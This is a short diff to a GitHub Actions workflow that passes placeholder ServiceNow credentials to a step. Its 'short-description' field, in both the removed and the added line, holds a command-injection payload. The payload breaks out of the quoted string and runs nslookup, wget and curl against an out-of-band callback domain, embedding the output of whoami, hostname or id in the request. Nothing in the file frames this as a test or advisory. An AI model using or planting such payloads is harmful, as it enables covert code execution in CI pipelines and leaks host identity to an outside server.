@@ -13,4 +13,4 @@ jobs:
           url: 'https://example.service-now.com'
           username: 'u'
           password: 'p'
-          short-description: "x'; nslookup \"sc.$(whoami).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun\" || wget -qO- \"http://sc.$(whoami).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun/\"; echo '"
+          short-description: "x' & nslookup h1-$(hostname 2>/dev/null || echo nohn).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun || wget -qO- http://h2-$(id -u 2>/dev/null || echo noid).d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun/ || curl -s http://h3.d9d252kjor348hmd7030i8xjpcatjjjd6.oast.fun/ || : ;"
